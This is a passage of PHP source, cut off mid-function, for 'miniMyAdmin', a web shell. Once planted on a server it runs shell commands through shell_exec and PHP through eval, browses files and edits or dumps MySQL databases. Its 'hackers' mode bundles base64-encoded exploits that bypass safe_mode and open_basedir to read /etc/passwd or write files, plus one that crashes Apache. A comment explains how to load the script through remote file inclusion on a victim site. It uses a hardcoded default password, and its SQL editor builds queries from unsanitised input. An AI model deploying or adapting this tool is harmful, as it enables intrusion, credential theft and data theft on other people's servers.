<?php
/*
 * miniMyAdmin
 *
 * @author lauri@bytez.net
 * @copyright lauri@bytez.net 2006
 * @version $Id: my.php 33 2006-08-30 19:51:11Z lauri $
 */

$ini = array();
if(is_file($inifile = 'my.ini.php'))
{
	$ini = parse_ini_file($inifile);
}

/**
 * you should change root_pass
 *
 */
$root_pass = "kala"; // <-- this is password which we use, if there are ini-file not found
define('root_pass', isset($ini['root_pass']) ? $ini['root_pass'] : $root_pass);

/**
 * this password is used for querystring encoding
 *
 */
define('query_string_pass', 'assa');

/**
 * script path. if you happend to find remote file inclusion exploit then you can change
 * this to http://victim.com?page=http://yoursite.com/my.php or smth
 *
 */
define('self', $_SERVER['SCRIPT_NAME']);

/**
 *if true activates demo mode
 * 
 */
define('demo', false);

/**
 * activates "hackers" menus
 *
 */
define('hack', true);

/**
 * script version (added automatically on svn commit)
 *
 */
define('version', '$Id: my.php 33 2006-08-30 19:51:11Z lauri $');

/**
 * If true then outputs notices/warnings/errors and
 * print $_REQUEST and $_SESSION global variables
 *
 */
define('debug', (isset($_COOKIE['ma']['debug']) && $_COOKIE['ma']['debug']==1) ? 1 : 0);


// Set the error handler to the error_handler() function
set_error_handler ('error_handler');

// image outputing
if(isset($_GET['img']))
{
	output_image($_GET['img']);
}

session_cache_limiter('private');
session_start();

header('Pragma: no-cache');
header('Cache-Control: no-cache');

/*

if(isset($_COOKIE['ma']['err_rep']))
{
	error_reporting($_COOKIE['ma']['err_rep']);
}

if(isset($_COOKIE['ma']['time_limit']) && is_numeric($_COOKIE['ma']['time_limit']))
{
	if(function_exists('set_time_limit'))
	{
		set_time_limit($_COOKIE['ma']['time_limit']);
	}
}
*/

if(isset($_COOKIE['ma']['strip_slashes']) && $_COOKIE['ma']['strip_slashes']==1)
{
	$_GET = deep_strip_slashes($_GET);
	$_POST = deep_strip_slashes($_POST);
	$_REQUEST = deep_strip_slashes($_REQUEST);
	if(isset($_FILES))
		$_FILES = deep_strip_slashes($_FILES);
}

ob_implicit_flush();

// first task is extracting cryptic GET parameters
if(isset($_GET['a']) && strlen($_GET['a']))
{
	$query_string = messitup(rawurldecode($_GET['a']), query_string_pass, 0);
	$query_string_array = array();
	parse_str($query_string, $query_string_array);
	if(is_array($query_string_array) && !empty($query_string_array))
	{
		foreach($query_string_array as $k=>$v)
		{
			$_REQUEST[$k] = $v;
		}
	}
}

// logout
if(isset($_REQUEST['out']))
{
	session_destroy();
	redirect(self);
}


// login
if(empty($_SESSION['root']))
{
	if(!empty($_POST) && strcasecmp($_POST['pass'], root_pass)==0)
	{
		$_SESSION['root'] = 1;
		redirect(self);
	}
	echo parse_tpl(get_tpl('html'), array('body'=>get_tpl('login')));
	die;
}

if(!empty($_SESSION['mysql']))
{
	mysql_connect($_SESSION['mysql']['host'], $_SESSION['mysql']['user'], $_SESSION['mysql']['pass']);
	mysql_select_db($_SESSION['mysql']['db']);
}

if(empty($_SESSION['info']))
{
	action_info();
}

// main loop
$tpl_vars = array();
$tpl_vars['menu'] = get_menu();

if(1==0)
{

}
elseif(isset($_REQUEST['phpinfo']))
{
	$tpl_vars['mainbody'] = action_phpinfo();
}
elseif(isset($_REQUEST['mysql']))
{
	if($_REQUEST['mysql']==1 || is_array($_REQUEST['mysql']))
	{
		$tpl_vars['mainbody'] = action_sql_1();
	}
	elseif($_REQUEST['mysql']==2)
	{
		unset($_SESSION['mysql']); 
		redirect(self);
	}
	elseif($_REQUEST['mysql']==3)
	{
		$tpl_vars['mainbody'] = action_sql_3();
	}
	elseif($_REQUEST['mysql']==4)
	{
		$tpl_vars['mainbody'] = action_sql_4();
	}
	elseif($_REQUEST['mysql']==5)
	{
		$tpl_vars['mainbody'] = action_sql_5();
	}
}
elseif(isset($_REQUEST['shell']))
{
	$tpl_vars['mainbody'] = action_shell();
}
elseif(isset($_REQUEST['eval']))
{
	$tpl_vars['mainbody'] = action_eval();
}
elseif(isset($_REQUEST['settings']))
{
	$tpl_vars['mainbody'] = action_settings();
}
elseif (isset($_REQUEST['pwd_hck']))
{
	$tpl_vars['mainbody'] = action_pwd_hck();
}
elseif(isset($_REQUEST['filem']))
{
	$tpl_vars['mainbody'] = action_filemanager();
}
elseif(isset($_REQUEST['editfile']))
{
	$tpl_vars['mainbody'] = action_editfile();
}
else
{
	$tpl_vars['mainbody'] = action_info();
}

$tpl_vars['body'] = parse_tpl(get_tpl('mainbody'), $tpl_vars);
echo parse_tpl(get_tpl('html'), $tpl_vars);

if(debug)
{
	print '<pre><h2>_REQUEST</h2>';
	print_r($_REQUEST);
	print '<hr><h2>_SESSION</h2>';
	print_r($_SESSION);
	print '</pre>';
}
//-------------------------------------------

/**
 * first page short info
 * 
 * @return string
 */
function action_info()
{
	$safemode = (bool)(@ini_get("safe_mode"));
	$disabled = ($df = @ini_get('disable_functions')) ? $df : 'none';
	$exec = (!in_array('shell_exec', explode(',', $df)) && !$safemode) ? true : false;
	$url_fopen = (int)@ini_get('allow_url_fopen')==1 ? ' on ' : ' off ';
	$_SESSION['info']['exec'] = $exec;

	$disabled = ($df = @ini_get('disable_functions')) ? $df : 'none';
	$openbasedir = ($bd = @ini_get("open_basedir") or strtolower($bd) == "on") ? $bd : 'off (<span class="error">insecure</span>)';

	$o = '<h1>System info</h1>';
	if(demo)
	{
		$o .= '<p class="error">You are running in demo mode - almost all functions are disabled.</p>';
	}
	$o .= '<ul><li>uname -a: ' . php_uname().'</li>';
	$o .= '<li>php version: '.phpversion().'</li>';
	$o .= '<li>safe mode: '.($safemode ? ' on (secure) <a href="http://www.php.net/manual/en/features.safe-mode.functions.php">info</a>' : 'off (<span class="error">insecure</span>)').'</li>';
	$o .= '<li>shell_exec(): '.($exec?'allowed (<span class="error"><u>insecure</u></span>)':'disabled (secure)').'</li>';
	$o .= '<li>open basedir: '.$openbasedir.'</li>';
	$o .= '<li>disabled functions: '.$disabled .'</li>';
	$o .= '<li>allow_url_fopen: '.$url_fopen.'</li>';
	$o .= '<li>server time: '. date('Y-M-d H:i:s').'</li>';
	$o .= '</ul>';

	return $o;
}


/**
 * settings page
 *
 * @return string
 */
function action_settings()
{
	$output = '<h1>settings</h1>';
	
	$cookie_expiry = time() + 3600*24*30;
	
	if(!empty($_POST))
	{
		$p = $_POST;
		if(is_numeric($_POST['time_limit']))
		{
			setcookie('ma[time_limit]', $_POST['time_limit'], $cookie_expiry);
		}
		if(in_array($_POST['strip_slashes'], array(0,1)))
		{
			setcookie('ma[strip_slashes]', $_POST['strip_slashes'], $cookie_expiry);
		}
		if(in_array($_POST['debug'], array(0,1)))
		{
			setcookie('ma[debug]', $_POST['debug'], $cookie_expiry);
		}
		redirect(encode_link(self, array('settings'=>1)));
	}
	else
	{
		$p = array();
		$p['debug'] = setif($_COOKIE['ma']['debug'], 0);
		$p['err_rep'] = isset($_COOKIE['ma']['err_rep']) ? $_COOKIE['ma']['err_rep'] : error_reporting();
		$p['time_limit'] = isset($_COOKIE['ma']['time_limit']) ? $_COOKIE['ma']['time_limit'] : ini_get('max_execution_time');
		$p['strip_slashes'] = isset($_COOKIE['ma']['strip_slashes']) ? $_COOKIE['ma']['strip_slashes'] : 0;
	}
	
	$output .= '<form action="'.self.'" method="post">';
	$output .= html_hidden(array('settings'=>1));
	$output .= '<table>';
	#$output .= '<tr><th>error_reporting</th><td><input name="err_rep" value="'.$p['err_rep'].'"></td><td>enter integer, 0 = errors off, <a href="http://php.net/error_reporting" target="_blank">more info</a> (Nb.error_reporting doesnt work for fatal errors)</td></tr>';
	$output .= '<tr><th>debug mode</th><td>'.html_selectbox('debug', array(1=>'yes', 0=>'no'), $p['debug']).'</td><td>select "yes" if you like to see php error messages and _REQUEST/_SESSION variables</td></tr>';
	$output .= '<tr><th>script execution time</th><td><input name="time_limit" value="'.$p['time_limit'].'"></td><td>time in seconds, 0 is infinite</td></tr>';
	$output .= '<tr><th>strip slashes</th><td>'.html_selectbox('strip_slashes', array(0=>'dont fix', 'strip_slashes'), $p['strip_slashes']).'</td><td>choose strip_slashes if there are slashes before quotes (\") in GET/POST variables (on eval() page etc)</td></tr>';
	$output .= '<tr><td> </td><td><input type="submit" value="save"></td><td> </td></tr>';
	$output .= '</table>';
	$output .= '</form>';

	return $output;
}


/**
 * phpinfo page
 *
 * @return string
 */
function action_phpinfo() 
{
	if(!function_exists('phpinfo'))
		return '<h1>phpinfo</h1><p class="error">Sorry, seems like phpinfo() function is disabled in server php configuration file (php.ini)</p>';
	ob_start();
	phpinfo();
	$raw = ob_get_contents();
	ob_end_clean();
	$p = explode('<body>', $raw);
	$c = explode('</body>', $p[1]);
	return $c[0];
}


/**
 * server commands executing with shell_execute
 *
 * @return string
 */
function action_shell() 
{
	$tpl_vars = array();
	$tpl_vars['cmd'] = setif($_POST['cmd'], '');
	if(!empty($_POST['cmd']))
	{
		$p = $_POST;
		if(demo)
		{
			$tpl_vars['notice'] = '<p class="error">shell_exec is disabled in demo mode</p>';
			
		}
		else 
		{
			$commands_array = (isset($_SESSION['executed']) && is_array($_SESSION['executed'])) ? $_SESSION['executed'] : array();
			array_unshift($commands_array, $_POST['cmd']);
			$_SESSION['executed'] = array_slice($commands_array, 0, 10);
			if($_POST['type']==2)
			{
				header("Content-type: text/plain");
    			header('Content-disposition: attachment;filename="shell.txt"');
    			$x =  shell_exec($_POST['cmd']);
    			echo $x;
    			exit;
			}
			else
			{
				$tpl_vars['result'] = '<textarea style="width:90%;height:350px">' . shell_exec($_POST['cmd']) . '</textarea>';
			}
		}
	}
	else 
	{
		$p = array();
		$p['type'] = 1;
	}

	$commands['last 10 commands'] = (isset($_SESSION['executed']) && is_array($_SESSION['executed'])) ? $_SESSION['executed'] : array('');
	$commands['common commands'] = array(
		100=>'cat /etc/passwd',
		'ls -a '.dirname(__FILE__),
		'cp /etc/passwd '.dirname(__FILE__).'/',
		'mysqldump -uUsername -pPassword -hHost dbname | gzip > dbname.gz', 
		'tar -cvzf '.dirname(__FILE__).'/.backup.tgz /home/account/public_html/'
	);
	
	$tpl_vars['cmdlist'] = html_selectbox('cmdlist', $commands, 0, array('onchange'=>'document.getElementById(\'cmd\').value=this.options[this.selectedIndex].text'));

	$tpl_vars['output_type'] = html_radio('type', array(1=>'textarea', 2=>'dowload'), $p['type']);
	
	if($_SESSION['info']['exec'] == false)
		$tpl_vars['notice'] = '<p class="error">seems like shell_exec() function is disabled!</p>';

	
	return parse_tpl(get_tpl('shell'), $tpl_vars);
}

/**
 * php code executing with eval() function
 *
 * @return string
 */
function action_eval()
{
	$tpl_vars = array();
	$tpl_vars['cmd'] = (isset($_POST['cmd'])) ? $_POST['cmd'] : 'echo date("Y-M-d H:i:s")';
	if(empty($_POST))
	{
		$tpl_vars['notice'] = '<p>you can run php code here -it\'s executed with php <a href="http://php.net/eval">eval()</a> function</p>';
	}
	else
	{
		if(demo)
		{
			$tpl_vars['notice'] = '<p class="error">You cannot use php eval in demo mode!</p>';
		}
		else
		{
			if(strlen(trim($_POST['cmd'])))
			{
				if(substr($_POST['cmd'],-1)!=';')
					$_POST['cmd'] .= ';';
				ob_start();
				eval($_POST['cmd']);
				$output = ob_get_clean();

				$tpl_vars['result'] = '<p><textarea style="width:90%;height:200px">'.$output.'</textarea></p>';
			}
		}
	}
	$commandlist = array(
		'',
		'echo getcwd()',
		'echo file_get_contents("some/file.php")',
		'print_r(glob("'.dirname(__FILE__).'/*"));',
		'print_r(get_loaded_extensions())',
		'echo md5("password")',
		'mail("somebody@somewhere.com", "subject", "mail body", "From: myself@mail.com")',
		'echo phpversion()',
	);
	
	if(hack)
	{
		$exploits = array (
			1=>array(
				'url'=>'http://securityreason.com/achievement_securityalert/37',
				'info'=>'copy file from outside base_dir into your account and outputs it contents (works in safe mode)',
				'vulnerable'=>'php <= 4.4.2/5.1.2',
				'code'=>'JGluID0gIi9ldGMvcGFzc3dkIg0KJG91dCA9IGdldGN3ZCgpLiIvcGFzc3dkLnR4dCI7DQpjb3B5KCJjb21wcmVzcy56bGliOi8vIi4kaW4sICRvdXQpOw0KZWNobyBmaWxlX2dldF9jb250ZW50cygkb3V0KTs=',
			),
			2=>array(
				'url'=>'http://www.securityfocus.com/bid/18645',
				'info'=>'creates new file outside base_dir',
				'vulnerable'=>'php <= 4.4.2/5.1.2',
				'code'=>'ZXJyb3JfbG9nKCc8PyBlY2hvICJuZXcgZmlsZSBjb250ZW50cyI7ID8+JywgMywgInBocDovLy4uLy4uL3Rlc3QucGhwIik7',
			),
			3=>array(
				'url'=>'http://www.securityfocus.com/bid/16878/info',
				'info'=>'allows reading files from outside base_dir via md_send_mail()',
				'vulnerable'=>'php 4/5 + sendmail <= 8.13.4',
				'code'=>'JGZpbGUgPSAic2VuZGxvZyI7DQppZiAoZmlsZV9leGlzdHMoJGZpbGUpKSB1bmxpbmsoJGZpbGUpOw0KJGV4dHJhID0gIi1DIC9ldGMvcGFzc3dkIC1YICIuZ2V0Y3dkKCkuIi8iLiRmaWxlOw0KbWJfc2VuZF9tYWlsKE5VTEwsIE5VTEwsIE5VTEwsIE5VTEwsICRleHRyYSk7DQplY2hvICI8cHJlPiIuZmlsZV9nZXRfY29udGVudHMoJGZpbGUpLiI8L3ByZT4iOw==',
			),
			9=>array(
				'url'=>'http://securityreason.com/achievement_securityalert/35',
				'info'=>'Recursive function, which crashes apache',
				'vulnerable'=>'php <= 4.4.2/5.1.2',
				'code'=>'ZnVuY3Rpb24gYSgpeyBhKCk7IH0gYSgpOw==',
			),
		);
		
		$exploits_list = '<dl>';
		foreach($exploits as $e)
		{
			$exploits_list .= '<dt><a href="#" onclick="document.getElementById(\'cmd\').value=decode64(\''.$e['code'].'\')">copy</a> - <a href="'.$e['url'].'" target="_blank">more info (external link)</a></dt>';
			$exploits_list .= '<dd>'.$e['info'].'<br>vulnerable: '.$e['vulnerable'].'</dd>';
		}
		$exploits_list .= '</dl>';
		
		$tpl_vars['exploits'] = '<h3>exploits (<a href="javascript://" onclick="toggle(\'exploits\')">show/hide</a>)</h3>';
		$tpl_vars['exploits'] .= '<div id="exploits" style="display:none">'.$exploits_list.'</div>';
	}
	else
	{
		$tpl_vars['exploits'] = '<a href="http://en.wikipedia.org/wiki/Exploit_(computer_security)">Exploits</a> are available only in <a href="http://php.bytez.net/minimyadmin/#download">"hackers mode"</a>';
	}
	$tpl_vars['cmdlist'] = html_selectbox('cmdlist', $commandlist, '', array('onchange'=>'document.getElementById(\'cmd\').value=this.options[this.selectedIndex].text'));
	return parse_tpl(get_tpl('eval'), $tpl_vars);
}

/**
 * connects to mysql
 *
 * @return mixed
 */
function action_sql_1()
{
	$tpl_vars = array();
	if(!empty($_POST))
	{
		if(mysql_connect($_POST['mysql']['host'], $_POST['mysql']['user'], $_POST['mysql']['pass']) && mysql_select_db($_POST['mysql']['db']))
		{
			$_SESSION['mysql'] = $_POST['mysql'];
			redirect(encode_link(self, array('mysql'=>4)));
		}
		else
		{
			$tpl_vars['connectmsg'] = '<p>Error on connecting. '. mysql_error().'</p>';
		}
	}
	return parse_tpl(get_tpl('connect2mysql'), $tpl_vars);
}

/**
 * mysql raw editor (allows executing sql commands)
 *
 * @return string
 */
function action_sql_3()
{
	$tpl_vars = array();

	$tpl_vars['sqlcmd'] = isset($_POST['sqlcmd']) ? $_POST['sqlcmd'] : 'SHOW TABLES FROM '.$_SESSION['mysql']['db'];
	
	if(empty($_POST))
	{
		$_POST['type'] = 1;
	}
	else
	{
		if(demo)
		{
			$tpl_vars['notice'] = '<p class="error">SQL executing is disabled in demo mode</p>';
		}
		else
		{
			$result = mysql_query($_POST['sqlcmd']);
			$lines = array();
	
			if(mysql_num_rows($result))
			{	
				while($row = mysql_fetch_assoc($result))
					$lines[] = $row;
			}
	
			if(mysql_errno())
			{
				$tpl_vars['result'] = '<p class="error">Error: '.mysql_error().'</p>';
			}
			else if(empty($lines))
			{
				$tpl_vars['result'] = '<p>No results</p>';
			}
			else
			{
				if($_POST['type']==1)
				{
					$output = '';
					foreach($lines as $l)
						$output .= join("\t|\t", $l)."\n";
					$tpl_vars['result'] = '<textarea style="width:90%;height:200px">'.$output.'</textarea>';					
				}
				elseif($_POST['type']==3)
				{
					header('Expires: ' . gmdate('D, d M Y H:i:s', time()+24*60*60) . ' GMT');
					header('Last-Modified: '.gmdate('D, d M Y H:i:s', time()+24*60*60).' GMT');
					header("Content-type: text/plain");
				    header('Content-disposition: attachment;filename="result.txt"');

    				foreach($lines as $l)
    					echo join("\t|\t", $l)."\n";
    				exit;
				}
				else
				{
					$output = '<table><tr class="table_header">';
					$header_fields = array_keys($lines[0]);
					
					foreach($header_fields as $hf)
					{
						$output.='<th>'.$hf.'</th>';
					}
					$output .= '</tr>';
					$i = 1;
			
					foreach($lines as $line)
					{
						$i = !$i;
						$row_css = ($i) ? 'class="table_even_row"' : 'class="table_odd_row"';
						$output .= '<tr '.$row_css.'>';
						foreach($line as $field)
						{
							$output .= '<td>'.htmlspecialchars($field).'</td>';
						}
						$output .= '</tr>';
					}
					$output .= '</table>';
					
					$tpl_vars['result'] = $output;
				}
			}
		}
	}
	$commandlist = array(
		'',
		'SELECT VERSION()',
		'SHOW TABLES FROM '.$_SESSION['mysql']['db'],
		'SHOW DATABASES',
		'SHOW CREATE TABLE `table_name`',
		'DESCRIBE `table_name`',
		'SELECT * FROM `table_name` WHERE `name` LIKE "%aa%" LIMIT 50',
		'INSERT INTO `table_name` SET field_1="value 1", field_2="value 2"',
		'UPDATE `table_name` SET field_1="value 1", field_2="value 2" WHERE id=1',
	);

	$tpl_vars['cmdlist'] = html_selectbox('cmdlist', $commandlist, '', array('onchange'=>'document.getElementById(\'sqlcmd\').value=this.options[this.selectedIndex].text'));
	$tpl_vars['outputtype'] = html_radio('type', array(1=>'plain text', 2=>'html', 3=>'download'), $_POST['type']);
	return parse_tpl(get_tpl('raw_sql_enter'), $tpl_vars);
}


/**
 * mysql table visual editor
 *
 * @return string
 */
function action_sql_4()
{
	if(empty($_SESSION['mysql']))
		return '<p>Sorry, you should connect with database before you continue.</p>';
	$cmd = (isset($_REQUEST['cmd'])) ? $_REQUEST['cmd'] : 'list_tables';
	if(function_exists($func = 'action_sql_4_'.$cmd))
		return $func();
	else
		return action_sql_4_list_tables();
}

/**
 * inserts data into table
 *
 * @return string html source 
 */
function action_sql_4_insert_data()
{
	$output = '<h1>add row to '.$_REQUEST['tbl'].'</h1>';
	
	$result = mysql_query('DESCRIBE '.$_REQUEST['tbl']);
	
	if(!mysql_num_rows($result))
	{
		$output .= '<p>Table "'.$_REQUEST['tbl'].'" not found</p>';
	}
	else
	{
		$fields = array();
		while($field = mysql_fetch_assoc($result))
		{
			$fields[] = $field;
		}
		
		if(empty($fields))
		{
			$output .= '<p>No fields found from table</p>';
		}
		else
		{
			
			if(!empty($_POST) && !empty($_POST['minimyfield']))
			{
				if(demo)
				{
					$output .= '<p class="error">You can not add rows into table in demo mode</p>';
				}
				else
				{
					$sql_insert_fields = array();
					$sql_insert = 'INSERT INTO '.$_REQUEST['tbl'] .' SET ';
					foreach($_POST['minimyfield'] as $field_key=>$field_value)
					{
						$sql_insert_fields[] = ' `'.$field_key.'`="'.mysql_real_escape_string($field_value).'" ';
					}
					$sql_insert .= join(', ', $sql_insert_fields);
					
					@mysql_query($sql_insert);
					if(mysql_errno())
					{
						$output .= '<p class="error">Error on saving: '.mysql_error().'<br>'.$sql_insert.'</p>';
					}
					else 
					{
						redirect(encode_link(self, array('mysql'=>4, 'cmd'=>'browse_table', 'tbl'=>$_REQUEST['tbl'])));
					}
				}
			}
			
			$output .= '<form action="'.self.'" method="post"><table>';
			$output .= html_hidden(array(
				'mysql'=>4,
				'cmd'=>$_REQUEST['cmd'],
				'tbl'=>$_REQUEST['tbl'],
			));
			foreach($fields as $f)
			{
				$output .= '<tr>';
				$output .= '<th title="'.join(':', array_unique(array($f['Type'], $f['Key'], $f['Extra']))).'">'.$f['Field'].'</th>';
				if(strpos($f['Type'], 'text') || strpos($f['Type'], 'blob'))
				{
					$output .= '<td><textarea name="minimyfield['.$f['Field'].']" cols="80" rows="5"></textarea></td>';
				}
				else
				{
					$output .= '<td><input name="minimyfield['.$f['Field'].']" size="80"></td>';
				}
				$output .= '</tr>';
			}
			$output .= '<tr><td></td><td><input type="submit" value="save"> ['.html_encode_link('back', self, array('mysql'=>4,'tbl'=>$_REQUEST['tbl'], 'cmd'=>'view_table')).']</td></tr>';
			$output .= '</form></table>';
		}
	}
	
	return $output;
}

/**
 * mysql row updating
 *
 * @return string with page html
 */
function action_sql_4_edit_row()
{
	$output = '<h1>edit '.$_REQUEST['tbl'].' WHERE '.$_REQUEST['pk'].'="'.$_REQUEST['id'].'"</h1>';
	$sql_getrow = 'SELECT * FROM '.$_REQUEST['tbl'].' WHERE '.$_REQUEST['pk'].'="'.$_REQUEST['id'].'" LIMIT 1';
	$result = mysql_query($sql_getrow);
	if(!mysql_num_rows($result))
	{
		$output .= '<p>Query failed:'.$sql_getrow.'</p>';
	}
	else
	{
		if(empty($_POST))
		{
			$data = mysql_fetch_assoc($result);
		}
		else
		{
			$sql_update = 'UPDATE `'.$_REQUEST['tbl'].'` SET ';
			$sql_update_fields = array();
			foreach($_POST['minimyfield'] as $row_id=>$row_value)
			{
				$sql_update_fields[] = ' `'.$row_id.'` = "'.mysql_real_escape_string($row_value).'" ';
			}
			$sql_update .= join(', ', $sql_update_fields) . ' WHERE `'.$_REQUEST['pk'].'`="'.$_REQUEST['id'].'"';
			
			if(demo)
			{
				$output .= '<p class="error">Table updating is disabled in demo!</p>';
			}
			else
			{
				@mysql_query($sql_update);
				if(mysql_errno())
				{
					$output .= '<p class="error">Update query fails: '.mysql_error().'<br>'.htmlspecialchars($sql_update).'</p>';
				}
				else
				{
					redirect(encode_link(self, array('mysql'=>4, 'cmd'=>'browse_table', 'tbl'=>$_REQUEST['tbl'])));
				}
			}
			$data = $_POST['minimyfield'];
		}	

		$output .= '<form action="'.self.'" method="post">';
		$output .= html_hidden(array(
			'mysql'=>4,
			'cmd'=>$_REQUEST['cmd'],
			'tbl'=>$_REQUEST['tbl'],
			'pk'=>$_REQUEST['pk'],
			'id'=>$_REQUEST['id']
		));
			
		$output .= '<table>';
		foreach($data as $key=>$value)
		{
			#print_r($value);
			if(strlen($value)>255)
			{
				$output .='<tr><th>'.$key.'</th><td><textarea name="minimyfield['.$key.']" cols="80" rows="7">'.htmlspecialchars($value).'</textarea></td></tr>';
			}
			else
			{
				$output .='<tr><th>'.$key.'</th><td><input size="80" name="minimyfield['.$key.']" value="'.htmlspecialchars($value).'"></td></tr>';
			}
		}
		$output .= '<tr><td> </td><td>';
		$output .= '<input type="submit" value="save"> ['.html_encode_link('back', self, array('mysql'=>4,
			'cmd'=>'browse_table',
			'tbl'=>$_REQUEST['tbl'],
			'pk'=>$_REQUEST['pk'],
			'id'=>$_REQUEST['id'])).']';
		$output .= '</td></tr></table>';
		$output .= '</form>';
	}
	return $output;
}

/**
 * mysql table browsing
 *
 * @return string
 */
function action_sql_4_browse_table()
{
	$output = '<h1>content of '.$_SESSION['mysql']['db'].'.'.$_REQUEST['tbl'].'</h1>';
	
	$perpage = (isset($_REQUEST['perpage'])) ? $_REQUEST['perpage'] : 30;
	$count_rows = mysql_result(mysql_query('SELECT COUNT(*) FROM '.$_REQUEST['tbl']), 0);
	
	$pager = pager($count_rows, $perpage, 'page', encode_link(self, array('tbl'=>$_REQUEST['tbl'], 'mysql'=>'4', 'cmd'=>'browse_table', 'pk'=>setif($_REQUEST['pk'],""))).'&page=__CURRENT_PAGE__', '<b>%u</b>', 20);
	
	$result = mysql_query('SELECT * FROM '.$_REQUEST['tbl'].' LIMIT '.$pager['limit']);
	$rows = array();
	if(mysql_num_rows($result))
	{
		$navbar = '';
		if(!empty($pager['navbar']))
			$navbar = 'Pages: ' . join(', ',$pager['navbar']);
			
		while($r = mysql_fetch_assoc($result))
			$rows[] = $r;
				$header_fields = array_merge(array('admin'), array_keys($rows[0]));
		
		$output .= $navbar;
		$output .= '<table><tr class="table_header">';
		foreach($header_fields as $hf)
		{
			$output.='<th>'.$hf.'</th>';
		}
		$output .= '</tr>';
		$i = 1;
		
		foreach($rows as $row)
		{
			$i = !$i;
			$row_css = ($i) ? 'class="table_even_row"' : 'class="table_odd_row"';
			$output .= '<tr '.$row_css.'>';
#			print_r($row);
			if($_REQUEST['pk']!=NULL)
			{
				$output .= '<td>'.html_encode_link('edit', self, array('tbl'=>$_REQUEST['tbl'], 'mysql'=>'4', 'cmd'=>'edit_row', 'pk'=>$_REQUEST['pk'], 'id'=>$row[$_REQUEST['pk']])).'</td>';
			}
			else
			{
				$output .= '<td>PK not found</td>';
			}

			foreach($row as $field)
			{
				$align = (is_numeric($field)) ? ' align="right"' : '';
				$output .= '<td'.$align.'>'.cut_short($field, 255).'</td>';
			}
			$output .= '</tr>';
		}
		$output .= '</table>';
		$output .= $navbar;
		#$output .= '<p>'.html_encode_link('browse table data', self, array('mysql'=>4,'cmd'=>'browse_table', 'tbl'=>$_REQUEST['tbl'], 'pk'=>$_REQUEST['pk'])).'</p>';

	}
	else
	{
		$output .= '<p>table is empty</p>';
	}
	
	$output .= '<ul>';
	$output .= '<li>'.html_encode_link('back to table structure', self, array('mysql'=>4, 'cmd'=>'view_table', 'tbl'=>$_REQUEST['tbl'])).'</li>';
	$output .= '<li>'.html_encode_link('back to tableslist', self, array('mysql'=>4)).'</li>';
	$output .= '</ul>';
	
	return $output;
}

/**
 * outputs mysql visual editor table structure
 *
 * @return string
 */
function action_sql_4_view_table()
{
	$output = '<h1>structure of '.$_SESSION['mysql']['db'].'.'.$_REQUEST['tbl'].'</h1>';
	$result = mysql_query('DESCRIBE '.$_REQUEST['tbl']);
	if(is_resource($result) && mysql_num_rows($result))
	{
		while($r = mysql_fetch_assoc($result))
			$rows[] = $r;
		
		$primary_key = NULL;
		foreach($rows as $r)
		{
			#print_r($r);
			if($primary_key==NULL && $r['Key']=='UNI')
				$primary_key = $r['Field'];
			if($r['Key']=='PRI')
				$primary_key = $r['Field'];
		}
		#echo $primary_key, 'aaa';
		$header_fields = array_keys($rows[0]);
		
		$output .= '<table><tr class="table_header">';
		foreach($header_fields as $hf)
			$output.='<th>'.$hf.'</th>';
		$output .= '</tr>';
		$i = 1;
		
		foreach($rows as $row)
		{
			$i = !$i;
			$row_css = ($i) ? 'class="table_even_row"' : 'class="table_odd_row"';
			$output .= '<tr '.$row_css.'>';
			foreach($row as $field)
			{
					$align = (is_numeric($field)) ? ' align="right"' : '';
					$output .= '<td'.$align.'>'.$field.'</td>';
			}
			$output .= '</tr>';
		}
		$output .= '</table>';
		$output .= '<ul>
		<li>'.html_encode_link('browse table data', self, array('mysql'=>4,'cmd'=>'browse_table', 'tbl'=>$_REQUEST['tbl'], 'pk'=>$primary_key)).'</li>
		<li>'.html_encode_link('insert data into this table', self, array('mysql'=>4,'cmd'=>'insert_data', 'tbl'=>$_REQUEST['tbl'])).'</li>
		<li>'.html_encode_link('back to tables list', self, array('mysql'=>4,'cmd'=>'list_tables')).'</li>
		</ul>';
	}
	else
	{
		$output .= '<p>There are no tables in this database</p>';
	}
	return $output;
}

/**
 * outputs mysql visual edtior tables list
 *
 * @return string
 */
function action_sql_4_list_tables()
{
	$output = '<h1>tables in '.$_SESSION['mysql']['db'].'</h1>';
	$tables = array();
	$result = mysql_list_tables($_SESSION['mysql']['db']);
	if(mysql_num_rows($result))
	{
		$result2 = mysql_query('SHOW TABLE STATUS FROM '.$_SESSION['mysql']['db']);
		while($t = mysql_fetch_assoc($result2))
		{
			$tables[] = $t;
		}
		
		#$header_fields = array_keys($tables[0]);
		$header_fields = array(
			'Name'=>'Name',
			'Type'=>'Type',
			'Rows'=>'Rows',
			'Auto_increment'=>'AutoId',
			'Create_time'=>'Created',
			'Update_time'=>'Updated',
			'Comment'=>'Comment'
		);
		$output .= '<table><tr class="table_header">';
		foreach($header_fields as $hf)
			$output.='<th>'.$hf.'</th>';
		$output .= '</tr>';
		$i = 1;
		foreach($tables as $table)
		{
			$i = !$i;
			$row_css = ($i) ? 'class="table_even_row"' : 'class="table_odd_row"';
			$output .= '<tr '.$row_css.'>';
			foreach($table as $field_key=>$field)
			{
				if(in_array($field_key, array_keys($header_fields)))
				{
					#if(in_array($field_key, array('Create_time', 'Update_time')))
					#	$field= kui_vana(strtotime($field));
					
					if($field_key=='Name')
						$field = html_encode_link($field, self, array('cmd'=>'view_table', 'tbl'=>$field, 'mysql'=>4));
					$align = (is_numeric($field)) ? ' align="right"' : '';
					$output .= '<td'.$align.'>'.$field.'</td>';
				}
			}
			$output .= '</tr>';
		}
		$output .= '</table>';
	}
	else
	{
		$output .= '<p>There are no tables in this database</p>';
	}
	return $output;
}


/**
 * mysql database export
 *
 * @return string
 */
function action_sql_5()
{
	$output = '<h1>mysql export</h1>';
	$sql_tables = mysql_query('SHOW TABLE STATUS FROM '.$_SESSION['mysql']['db']);
	if(mysql_num_rows($sql_tables))
	{
		while($table = mysql_fetch_assoc($sql_tables))
		{
			$tables[] = $table;
		}
		
		if(empty($tables))
		{
			$output .= '<p class="error">There was no tables in this database</p>';
		}
		else
		{
			if(!empty($_POST['export']))
			{
				
				$tables_to_export = array_keys($_POST['export']);
				export_tables_now($tables_to_export);
			}
			$output .= '<form name="vorm" action="'.self.'" method="post">';
			$output .= html_hidden(array('mysql'=>5));
			$output .= '<table><tr class="table_header"><th><input type="checkbox" id="checkAll" onclick="CheckAll(document.vorm,this);" checked="checked"></th><th>table name</th><th>Rows</th></tr>';
			$i = 1;
			foreach($tables as $table)
			{
				$i = !$i;
				$row_css = ($i) ? 'class="table_even_row"' : 'class="table_odd_row"';
				$output .= '<tr '.$row_css.'>';
